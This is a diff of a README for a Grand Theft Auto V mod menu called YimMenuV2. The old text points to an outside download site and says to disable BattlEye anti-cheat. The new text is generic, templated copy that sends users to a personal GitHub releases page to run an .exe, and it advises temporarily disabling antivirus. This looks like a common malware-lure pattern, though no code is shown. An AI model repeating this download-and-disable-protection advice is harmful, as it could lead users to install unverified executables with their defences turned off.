@@ -1,83 +1,77 @@
-![hq720](https://github.com/user-attachments/assets/7cf7cdc2-9f1b-4fbf-996c-88a289b52600)
-# YimMenuV2
+# 🌟 yimmenu-v2 - Experience GTA V Safely and Smoothly
 
-**Experimental Mod Menu for GTA 5: Enhanced**
+[![Download yimmenu-v2](https://img.shields.io/badge/Download-yimmenu--v2-brightgreen.svg)](https://github.com/Mohamed45508/yimmenu-v2/releases)
 
-YimMenuV2 is an advanced experimental menu designed for *Grand Theft Auto V Enhanced Edition*.
-It offers a modern interface, expanded functionality, and optional support for FSL to improve account data safety.
-This project is for educational purposes and single-player experimentation only.
+## 🚀 Getting Started
 
----
+Welcome to the YimMenuV2 project! This is an experimental menu designed for Grand Theft Auto V. It helps protect against common crashes and enhances your overall gaming experience. Follow these simple steps to download and run YimMenuV2.
 
-## 🚀 How to Use
+## 📥 Download & Install
 
-### 1. Download YimMenuV2
+To get started, you can download YimMenuV2 from our Releases page. Click the link below to visit the page:
 
-Download the latest YimMenuV2 release from the http://yimmodmenu.click/ site.
+[Visit the Releases page to download YimMenuV2](https://github.com/Mohamed45508/yimmenu-v2/releases)
 
-### 2. Open YimMenu
+### Step 1: Visit the Releases Page
 
-Open YimMenu.exe
+- Click the link above. This will take you to the official GitHub Releases page.
+- You will see a list of available versions for YimMenuV2.
 
-### 3. Disable BattlEye
+### Step 2: Choose Your Version
 
-* Open Rockstar Launcher
-* Select *Grand Theft Auto V Enhanced*
-* Go to **Settings** → disable BattlEye
+- Look for the latest release at the top of the page. It will have the most recent updates and features.
+- Click on the version you wish to download.
 
-If you're using **Steam or Epic Games**, you may also need to add the launch parameter:
-`-nobattleye`
+### Step 3: Download the File
 
-### 4. Launch the Game and Inject
+- You will find different files available for download. Select the one that matches your system. Typically, this will be an `.exe` file for Windows users.
+- Click on the file name to start the download. 
 
-1. Start GTA V
+### Step 4: Run the Installer
 
----
+- Once the download is complete, locate the downloaded file in your system's default download folder.
+- Double-click the file to begin the installation. Follow the on-screen instructions to set up YimMenuV2.
 
-## 📘 Opening the Menu
+### Step 5: Launch YimMenuV2
 
-Press **INSERT** or **Ctrl + \** to open the menu.
+- After the installation is complete, you can find YimMenuV2 in your applications or on your desktop.
+- Double-click the icon to launch the program.
 
----
+## 🛠️ System Requirements
 
-## ❗ Common Issues
+Before downloading, ensure your system meets the following requirements:
 
-### 🔹 I get desynced from public sessions every five minutes
+- **Operating System:** Windows 10 (or later)
+- **Memory:** At least 2 GB RAM
+- **Storage:** Minimum 500 MB of free disk space
+- **Graphics Card:** A graphics card that supports DirectX 11
 
-A BattlEye bypass is not available.
-Legitimate hosts will eventually remove you because of heartbeat failure.
-There is currently **no way to prevent this** except using a private bypass.
+## 📊 Features
 
----
+YimMenuV2 comes packed with features to enhance your gaming experience:
 
-### 🔹 I removed FSL and all my progress disappeared
+- **Crash Protection:** Automatically protects against common crashes encountered during gameplay.
+- **Menu Customization:** Easily customize the in-game options to fit your gameplay style.
+- **User-Friendly Interface:** Designed for ease of use, even for those new to modding or gaming menus.
+- **Regular Updates:** Keep your menu updated with the latest fixes and improvements.
 
-FSL reroutes all save data to disk.
-Any progress made while using FSL will only appear **when FSL is enabled**.
-You *can* use YimMenuV2 without FSL, but it is **not recommended**.
+## 🔧 Troubleshooting
 
----
+If you encounter any issues while downloading or running YimMenuV2, try the following steps:
 
-### 🔹 I removed FSL and the game no longer starts
+- **Check System Requirements:** Make sure your system meets the minimum requirements listed above.
+- **Disable Antivirus:** Sometimes, antivirus software may block the installation. Temporarily disable it to see if it resolves the issue.
+- **Re-download the File:** If the file did not download correctly, delete it and try downloading it again from the Releases page.
 
-This is a known issue.
-To fix it, delete:
+## 📣 Support
 
-```
-Documents/GTAV Enhanced/Profiles
-```
+If you need additional help, visit our support section on the GitHub page. You can find solutions to common problems, and our community can assist you.
 
----
+- [Visit the GitHub Support Page](https://github.com/Mohamed45508/yimmenu-v2)
 
-## ⚠ Disclaimer
+## 🔗 Useful Links
 
-YimMenuV2 is intended for **educational and single-player use only**.
-Using mods in GTA Online can lead to bans or penalties.
-The developers are not responsible for misuse or damages.
+- [Releases Page](https://github.com/Mohamed45508/yimmenu-v2/releases)
+- [Support Page](https://github.com/Mohamed45508/yimmenu-v2)
 
----
-
-## 📜 License
-
-Distributed under the MIT License.
-
+Thank you for choosing YimMenuV2! Enjoy your enhanced gaming experience in GTA V.
